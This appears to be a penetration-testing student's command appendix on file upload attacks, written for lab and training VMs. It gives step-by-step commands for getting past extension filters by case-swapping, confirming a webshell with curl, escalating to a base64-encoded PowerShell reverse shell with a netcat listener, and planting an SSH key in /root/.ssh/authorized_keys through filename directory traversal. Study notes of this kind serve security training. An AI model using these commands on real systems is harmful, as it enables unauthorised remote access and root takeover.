# File Upload Attacks, Command Appendix

Part of [[COMMAND APPENDIX]]. Getting an executable file past an upload filter, and what to do when the app won't ever execute what you upload at all.

---

## Filter Bypass Techniques

```
Case-swap the extension:        .php   ->  .pHP
Alternate/legacy extensions:    .phps, .php7
```
*Blacklist filters commonly compare the extension as a literal lowercase string, `.php` matches, `.pHP` may not, even though the web server still hands it to the PHP interpreter regardless of case. If case-swapping doesn't work, try an upload-as-innocuous-type-then-rename trick: upload as `.txt` first, then use the app's own rename feature (if it has one) to restore the executable extension after the upload filter has already been satisfied.*

**Confirm code execution once a webshell lands:**
```bash
curl "http://<target>/uploads/<shell>.pHP?cmd=whoami"
```
*Uploaded files commonly land in a predictable `uploads/`-style directory, check the app's own upload confirmation response for the exact path if it's not obvious.*

**Escalating to a Windows reverse shell through the uploaded webshell** (base64-encoded, since special characters in a PowerShell one-liner make raw delivery through a URL parameter unreliable):
```powershell
$Text = '<powershell reverse shell script>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```bash
nc -nvlp 4444
curl "http://<target>/uploads/<shell>.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
```
*Note the **Unicode** (UTF-16LE) encoding step before base64, that's specifically what `powershell -enc` expects, plain ASCII-then-base64 won't work.*

**Sanity check after landing code execution:** always run `whoami`/`id` immediately, training VMs frequently run the web server process as `root`/`nt authority\system` already, no privilege escalation needed at all before grabbing the flag.

See [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (case-swap + PowerShell reverse shell, and the TinyFileManager case study where no filter existed at all).

#### Tags: #FileUpload #ExtensionFilterBypass #CaseSwapBypass #PowerShellReverseShell #Base64Unicode

---

## When Nothing You Upload Will Ever Execute

Some upload mechanisms genuinely have no code-execution path at all (think a plain file-storage form). If the `filename` field itself is traversal-able, the fix is to combine the upload with Directory Traversal instead: overwrite a sensitive file elsewhere on disk rather than relying on the uploaded content being executed.

**Step 1: generate a keypair to plant**
```bash
ssh-keygen -f <keyname>          # -f skips the interactive path prompt
cat <keyname>.pub > authorized_keys
```

**Step 2: intercept the upload in Burp and rewrite the filename to a traversal path**
Enable Intercept, select `authorized_keys` in the upload form, submit, then in the caught request change the `filename` field to:
```
../../../../../../../root/.ssh/authorized_keys
```
Forward it.

**Step 3: connect with the planted key**
```bash
rm ~/.ssh/known_hosts            # needed if the hostname was reused from an earlier lab VM
ssh -p <port> -i <keyname> root@<target>
```

*Worth checking before assuming this'll work: what happens if you upload the same filename twice? An "already exists" response can be abused to brute-force server file/directory names, and a differing error message can leak the backend language/framework. Also worth remembering: web apps built on a language's own bundled dev server (rather than deployed properly under Apache/Nginx/IIS) are frequently run as root/Administrator directly, always worth testing for this rather than assuming least-privilege.*

See [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] for the full worked walkthrough.

#### Tags: #UploadPlusTraversal #AuthorizedKeysOverwrite #SSHKeyPlanting #BurpFilenameRewrite

---

## **Outstanding**
This area grows alongside the modules. Whenever a new upload-bypass trick comes up (magic-byte/MIME spoofing, double extensions, polyglot files, etc), add it here with a link back to the source section.
